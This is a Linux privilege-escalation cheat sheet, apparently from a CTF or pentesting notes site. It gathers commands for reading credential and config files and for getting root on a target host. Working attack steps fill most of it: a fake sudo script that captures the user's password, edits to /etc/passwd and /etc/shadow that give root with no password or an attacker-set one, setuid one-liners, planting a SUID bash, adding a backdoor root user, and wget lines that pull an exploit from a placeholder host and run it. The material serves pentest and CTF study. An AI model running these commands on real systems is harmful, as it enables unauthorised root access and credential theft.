---
title: Linux Privilege Escalation
description: Privilege Escalation (PrivEsc) is the act of exploiting a bug, a design flaw, or a configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user. Once you have root privileges on Linux, you can get sensitive information in the system.
tags:
    - Privilege Escalation
    - Remote Code Execution
refs:
    - https://book.hacktricks.xyz/linux-hardening/privilege-escalation
date: 2023-11-03
draft: false
---

## Automation

There are some tools for investigating automatically.

- **[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)**
- **[Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)**
- **[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)**

<br />

## Messages When Logged In

After logged in the target system, don’t miss the messages. We might find interesting information.

<br />

## OS Information

```sh
hostname
# Alias
hostname -a
# DNS
hostname -d
# IP address for the host name
hostname -i
# All IP address for the host
hostname -I

uname -a
# Kernel release
uname -r
# Kernel version
uname -v
# OS
uname -o

# OS kernel version
cat /proc/version
cat /etc/*release

# Current user
whoami
id
groups

# Environments
env
echo $PATH

# LSB (Linux Standard Base) and distribution information
lsb_release -a

# Positional arguments
echo $0
echo $1
echo $2
```

### Find OS/Kernel Vulnerability

If we run **`uname -a`** and get the OS version, search vulnerabilities.

```txt
Linux examplehost 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```

For example above, we can search **`ubuntu 4.4.0-31-generic`** in search engines.

<br />

## Interesting Information

```sh
# Bash files
# If we have the write permission for .bashrc or .profile, 
# we can write arbitrary command to any line in that files.
/home/<user>/.bash_history
/home/<user>/.bash_logout
/home/<user>/.bashrc
/home/<user>/.profile

# Authentication event logs
cat /var/log/auth.log | grep chpasswd
cat /var/log/auth.log | grep root
strings /var/log/auth.log | grep chpasswd
strings /var/log/auth.log | grep root

# Apache
cat /var/log/apache/access.log
cat /var/log/apache/error.log
cat /var/log/apache2/access.log
cat /var/log/apache2/error.log
cat /etc/apache2/.htpasswd
cat /etc/apache2/sites-enabled/domain.conf
cat /etc/apache2/sites-available/domain.conf
cat /etc/apache2/sites-available/000-default.conf
cat /usr/local/apache2/conf/httpd.conf
ls -al /usr/local/apache2/htdocs/

# Nginx
cat /var/log/nginx/access.log
cat /var/log/nginx/error.log
cat /etc/nginx/nginx.conf
cat /etc/nginx/conf.d/.htpasswd
cat /etc/nginx/sites-available/example.com.conf
cat /etc/nginx/sites-enabled/example.com.conf
cat /usr/local/nginx/conf/nginx.conf
cat /usr/local/etc/nginx/nginx.conf

# PHP web conf
cat /etc/php/x.x/apache2/php.ini
cat /etc/php/x.x/cli/php.ini
cat /etc/php/x.x/fpm/php.ini

# Bash Files
cat .bashrc
cat .bash_history
cat .bash_profile
cat .profile
cat /var/log/bash.log

# Cron jobs
cat /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*
cat /etc/cron.daily/*
cat /etc/cron.hourly/*
cat /etc/cron.monthly/*
cat /etc/cron.weekly/*
cat /var/spool/cron/*
cat /var/spool/cron/crontabs/*
# List all cron jobs
crontab -l
crontab -l -u username

# Hosts
cat /etc/hosts
# LDAP config
cat /etc/ldap/ldap.conf
# Messages
cat /etc/issue
cat /etc/motd

# MySQL (MariaDB)
cat /etc/mysql/my.cnf
cat /etc/mysql/debian.cnf
cat /etc/mysql/mariadb.cnf
cat /etc/mysql/conf.d/mysql.cnf
cat /etc/mysql/mysql.conf.d/mysql.cnf

# Nameserver
cat /etc/resolv.conf
# NFS settings
cat /etc/exports
# PAM
cat /etc/pam.d/passwd
# Sudo config
cat /etc/sudoers
cat /etc/sudoers.d/usersgroup
# SSH config
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
# Users and passwords
cat /etc/passwd
cat /etc/shadow
# List of all groups on the system
cat /etc/group

# File system table
cat /etc/fstab

# Xpad (sensitive information e.g. user password)
cat .config/xpad/*

# SSH keys
ls -la /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2> /dev/null; find / -name id_dsa 2> /dev/null; find / -name authorized_keys 2> /dev/null; cat /home/*/.ssh/id_rsa; cat /home/*/.ssh/id_dsa

# Root folder of web server
ls /var/www/

# Sometimes, we find something...
ls -la /opt/
ls -la /srv/

# Temporary files
ls -la /dev/shm/
ls -la /tmp

# Services
ls -al /etc/systemd/system/
ls -al /lib/systemd/system/
cat /etc/inetd.conf

# Mails
ls -la /var/mail
ls -la /var/spool/mail

# Security policies
ls -la /etc/apparmor.d/

# Routing table
ip route show
# -r: route
# -n: don't resolve name
netstat -rn

# Check outdated packages
apt list --upgradable
apt list --upgradable | grep polkit
```

<br />

## Kernel Information

```sh
# List kernel modules
lsmod
cat /proc/modules

# List symbols and addresses of kernel modules
cat /proc/kallsyms

# CPU information
cat /proc/cpuinfo

# Secuirty properties
checksec --kernel <module>
# e.g.
checksec --kernel bzImage

# Kernel logs
dmesg

# --human: Human readable output
dmesg --human
# --follow: Wait for new messages
dmesg --follow

# -f: Restrict defined facilities
dmesg -f auth
dmesg -f kern
dmesg -l mail
dmesg -l syslog
dmesg -f user

# -l: Restrict defined levels
dmesg -l alert
dmesg -l crit
dmesg -l err
dmesg -l info
dmesg -l user
```

<br />

## Open Ports

```sh
# -p: display PID/Program name for sockets
# -u: udp
# -n: don't resolve names
# -t: tcp
# -a: display all sockets
netstat -punta
# Filter only LISTEN ports
netstat -punta | grep -i listen

# -l: Display listening sockets
# -n: Don't resolve service names
# -t: TCP only
# -u: UDP only
ss -lntu
# -p: Show process using sockets
ss -nptu
```

### Access open ports that cannot be accessed from outside

If we discover a listen port that cannot be accessed externally as below, we can access this port by port forwarding.

```txt
tcp  0  0  127.0.0.1:8080  0.0.0.0:*  LISTEN  -                   
```

There are various methods to do that.

- **Method 1. Using Socat**

    In remote machine,  download the socat and run it.

    ```sh
    # we need to download the socat binary file from local machine
    wget http://<local-ip>:<local-port>/socat
    chmod +x socat
    socat tcp-listen:8090,fork,reuseaddr tcp:localhost:8080
    ```

- **Method 2. Using SSH Tunnel (SSH credential required)**

    In local machine, run the ‘ssh -L’.

    ```sh
    ssh -L 8090:localhost:8080 remote-user@<remote-ip>
    ```

Now we can access to **http://\<remote-ip\>:8090/** in local machine and actually can get the content of **http://\<remote-ip\>:8080/**.

<br />

## Running Processes

```sh
lsof
sudo lsof
# -l: List UID numbers
lsof -l
sudo lsof -l
# -i: Select by IPv[46] address
lsof -i :80
sudo lsof -i :80
lsof -i :443
sudo lsof -i :443

# Display the currently-running processes.
ps
ps aux
ps aux | grep ping
# If the right side of the result is cut off, pipe with cat command.
ps aux | cat
ps aux | cat | grep ping
```

By using **[pspy](https://github.com/DominicBreuker/pspy)**, you can fetch processes without root privileges.

```sh
./pspy64

# -p: print commands to stdout
# -f: print file system events to stdout
# -i: interval in milliseconds
./pspy64 -pf -i 1000
```

### Dump Information

If some process (like ping) is running as root, you may be able to capture the interesting information using tcpdump.

```sh
# -i lo: specify interface (lo: loopback address, localhost)
# -A: print each packet in ASCII
tcpdump -i lo -A
```

### Override Command

If some command is executed in processes as our current user, we can override the command to our arbitrary command.  
Assume **`sudo cat /etc/shadow`** command is executed in the process.  
**`sudo`** command asks the password of the current user. So if we don't have the current user's password yet, worth getting the password.

To do so, we can create the fake **`sudo`** command under the current user’s home directory.

```bash
mkdir /home/<user>/bin
touch /home/<user>/bin/sudo
chmod +x /home/<user>/bin/sudo
```

Then insert a payload in **`/home/<user>/bin/sudo`**.  
This **`sudo`** command reads the value of the password in prompt and write the value to **“password.txt”**.

```bash
#!/bin/bash

read password
echo $password >> /home/<user>/password.txt
```

In addition, we need to export the **`/home/<user>/bin`** to the PATH on the top of the **`/home/<user>/.bashrc`**.

```bash
export PATH=/home/<user>/bin:$PATH
```

Wait a while, we should see the **“password.txt”** is created.

```bash
cat password.txt
```

Now we get the current user password.

<br />

## Process Tracing

Sometimes we can retrieve the sensitive information by reading sequential processes with `stract`.

```bash
strace -e read -p `ps -ef | grep php | awk '{print $2}'`
```

<br />

## Running Services

To list all running services in Linux, use the following command.

```bash
systemctl --type=service --state=running
```

### Service Logs

Using `journalctl`, we can see logs of services running on `systemd`.

```sh
# All logs
journalctl

# Current boot
journalctl -b

# Kernel messages from boot
journalctl -k

# Recenct logs
# -e: Jump to the end in the pager
# -x: Details
journalctl -e
journalctl -ex

# Shog logs from specified unit
journalctl -u httpd
journalctl -u sshd
```

<br />

## Sensitive Files with Given Keywords

The **"find"** command searches files in the real system.

```sh
find / -name "*.txt" 2>/dev/null
find /opt -name "*.txt" 2>/dev/null
find / -name "passwd" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name "users" 2>/dev/null
find / -name "*user*" 2>/dev/null
find / -name "secret.key" -or -name "secret" 2>/dev/null
find / -name "credential*.txt" 2>/dev/null
find / -name "*secret*" -or -name "*credential*" 2>/dev/null
find / -name "*root*" -or -name "*password*" 2>/dev/null
find / -name "*.key" -or -name "*.db" 2>/dev/null
find / -name "*data*" 2>/dev/null
find / -name ".env" 2>/dev/null
find / -name "*flag*" 2>/dev/null

# SQL files
find / -name "*.sql" 2>/dev/null
strings example.sql

# Backup files may contain sensitive information
find / -name "*backup*" 2>/dev/null
find / -name "*.bak*" 2>/dev/null
find / -name "*.back*" 2>/dev/null
find / -name "*.old" 2>/dev/null

# Histories
find / -name "*history*" 2>/dev/null

# Backup files for /etc/shadow.
# ex. /var/shadow.bak
find / -name *shadow* 2>/dev/null

# Kerberos
find / -name "*.keytab" 2>/dev/null


# ----------------------------------------
# Find more faster than `find` command.
locate data
locate flag
locate flag*.txt
locate *flag*
locate password
locate *password*
locate *save*
locate *save.txt
locate user.txt
locate user*
locate *user*
locate root.txt
locate *root*
locate .db
locate .txt
```

### Exclude Path

We can exclude specific directory with `-not -path` option of `find` command.

```bash
find / -name "*.txt" -not -path "/usr/share" 2>/dev/null
```

<br />

## SUID/SGID (Set User ID/ Set Group ID)

It allows users to run an executable as root privilege.

```sh
# SUID
find / -type f -perm -u=s 2>/dev/null
find / -type f -perm -04000 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# SGID
find / -type f -perm -g=s 2>/dev/null
find / -type f -perm -02000 2>/dev/null
find / -user root -perm -2000 -exec ls -ldb {} \; 2>/dev/null
```

If you'll get some SUID files, research the information of them using **[GTFOBins](https://gtfobins.github.io/)**.

### Find

If the "find" command is set as SUID, you can execute some commands as root privileges.

```sh
find ./ -exec "whoami" \;
find /etc/shadow -exec cat {} \;
find /root -exec ls -al {} \;
```

### Cputils

If the "cputils" is set as SUID, you can copy the sensitive file to another one. 

```sh
cputils

Enter the name of source file: /home/<user>/.ssh/id_rsa
Enter the name of target file: /tmp/id_rsa
```

### Pandoc

1. Copy **`/etc/passwd`** and Update the Root Line

```bash
cp /etc/passwd .
vim passwd
```

Then update  **"root:x:..."** to **"root:password123:..."**.

2. Replace with Our New Passwd File

Using **`pandoc`** command, we can replace the original **`/etc/passwd`** with our updated **`passwd`** file.

```sh
pandoc ./passwd -t plain -o /etc/passwd
```

Now we can login as root using new password.

```bash
su root
Password: password123
```

### Firejail

[This exploit](https://www.openwall.com/lists/oss-security/2022/06/08/10/1) is useful.

```bash
# Download it in local machine
wget https://www.openwall.com/lists/oss-security/2022/06/08/10/1 -O exploit.py

# Transfer it to target machine
wget http://<local-ip>:8000/exploit.py
python3 exploit.py &
firejail --join=<PID>
su -
```

<br />

## Writable Directories & Files

```sh
# Writable directories
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | sort -u

# System service files
find / -writable -name "*.service" 2>/dev/null
```

<br />

## Capabilities

To find files that are set capabilities.

```sh
getcap -r / 2>/dev/null
```

### cap_chown

First we need to check the current user id by executing 'id' command.

```bash
id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then execute the following command to modify the file owner to the current user.  
Replace the attribute numbers with the current user id.

```bash
# Python
python -c 'import os;os.chown("/etc/shadow",33,33)'

# Ruby
ruby -e 'require "fileutils"; FileUtils.chown(33, 33, "/etc/shadow")'
# directories also can be modified.
ruby -e 'require "fileutils"; FileUtils.chown(33, 33, "/root")'
```

### cap_setuid

```bash
# Perl
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# PHP
php -r "posix_setuid(0); system('$CMD');"

# Python
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### cap_net_raw

```bash
# Tcpdump - we can sniff sensitive information by running tcpdump for a while.
tcpdump -i lo -A
```

### cap_dac_read_search

Bypass file read permission checks and directory read and execute permission checks.

```bash
# Tar (https://gtfobins.github.io/gtfobins/tar/)
LFILE=/etc/shadow
tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
```

<br />

## Set Capabilities

```sh
setcap cap_setuid+ep /path/to/binary
```

If you found the **setcap** with **SUID**, you can manipulate commands like Python.

```sh
cp /usr/bin/python3 /home/<current-user>/python3
setcap cap_setuid+ep /home/<current-user>/python3
```

Then get a root shell.

```sh
/home/<current-user>/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

<br />

## Override /etc/passwd, /etc/shadow

### /etc/passwd

If we have write permission of **`/etc/passwd`** by some means, we can modify this file as desired for us. First check the content of that file with **`cat /etc/passwd`**.

```bash
root:x:0:0:root:/root:/bin/sh
...
```

By removing this `x` character in the root line, we can become root without password. Below

```bash
root::0:0:root:/root:/bin/sh
...
```

After that, we can get a shell as root using the following command.

```bash
su root
```

### /etc/shadow

If we have write permission of **`/etc/shadow`** by some means, we can modify the password for each user.  
First of all, create a new password using **`openssl`**.

```bash

# -6: sha512 algorithm
# password: this is the root password
openssl passwd -6 salt=salt password

# output
$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.
```

After generating the hash, update the root password hash to this hash (**`$6$salt$I…`**) in **`/etc/shadow`**.

```bash
root:$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.:19532:0:99999:7:::
```

Now we can get a shell as root with the password "password".

```bash
su root
# password: password
```

<br />

## Sensitive Contents in Files

```sh
# -r: recursive
# -n: line number
# -i: ignore case
grep -rni root ./
grep -rni password ./
grep -rni passwd ./
grep -rni db_password ./
grep -rni db_passwd ./

# Find user's information
grep -rni root ./
grep -rni john ./

# -e: OR Searching
grep -re admin -re root -re credential -re password ./
grep -re secret -re key ./

# -v: Exclude
grep -rni password -v node_modules ./

# -E: regex
grep -riE 'flag{.*}' ./

# IP Address Searching
grep -rE -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" ./

# -h: no output filenames
grep -h root ./
```

<br />

## Disks (Drives)

List disks information on the target system.

```bash
# Find mounted folders
findmnt
# List information about block drives
lsblk
# or
fdisk -l
# or
ls -al /dev | grep disk

# --------------------------------------------------

# Result examples
NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
xvda    202:0    0  40G  0 disk 
└─xvda1 202:1    0  40G  0 part /etc/hosts
```

If we find the drives, we can mount it.

```bash
mkdir -p /mnt/tmp
mount /dev/xvda1 /mnt/tmp
```

<br />

## Crack User Passwords

If we can access **/etc/passwd** and **/etc/shadow** as well, we can crack user passwords using **unshadow** and **John The Ripper**.

### 1. Copy Files

```sh
cp /etc/passwd ./passwd.txt
cp /etc/shadow ./shadow.txt
```

### 2. Combines Two Files

```sh
unshadow passwd.txt shadow.txt > passwords.txt
```

### 3. Crack Passwords

```sh
john --wordlist=wordlist.txt passwords.txt

# If the hash in /etc/shadow contains the $y$ prefix, specify the hash format to "crypt".
# btw, $ye$ is the scheme of the yescrypt.
john --format=crypt --wordlist=wordlist.txt passwords.txt
```

<br />

## Execute Commands as Root Privilege

### Change Shebang in Shell Script

Add "-p" option at the first line to execute the script as root privilege.

```sh
#!/bin/bash -p
whoami
```

### Use the Set User ID (SUID)

If you can change permission of the **/bin/bash** , add **SUID** to the file.

```sh
chmod 4755 /bin/bash
```

Then you execute it as root privilege by adding "-p" option.  
You'll be able to pwn the target shell.

```sh
user@machine:~/$ /bin/bash -p
root@machine:~/$ whoami
root
```

<br />

## Update Sensitive Information

### 1. Change Password of Current User

We need to know the current user's password.

```sh
echo -n '<current-password>\n<new-password>\n<new-password>' | passwd
```

### 2. Add Another Root User to /etc/shadow

1. **Generate New Password**

    ```sh
    # -6: SHA512
    openssl passwd -6 -salt salt password
    ```

    Copy the output hash.

2. **Add New Line to /etc/shadow in Target Machine**

    You need to do as root privileges.

    ```sh
    echo '<new-user-name>:<generated-password-hash>:19115:0:99999:7:::' >> /etc/shadow
    ```

3. **Switch to New User**

    To confirm, switch to generated new user.

    ```sh
    su <new-user>
    ```

<br />

## Display the Content of Files You Don't Have Permissions

Using **"more"** command.

### 1. Make the Terminal's Window Size Smaller

### 2. Run "more" Command

The text like "--More--(60%)" will be appeared.

### 3. Press 'v' on Keyboard to Enter Vim Mode

### 4. Enter ':e ~/somefile'

<br />

## Password Guessing from Old One

```sh
password2021 -> password2022, password2023
april123 -> may123, june123
apple -> banana, orange
```
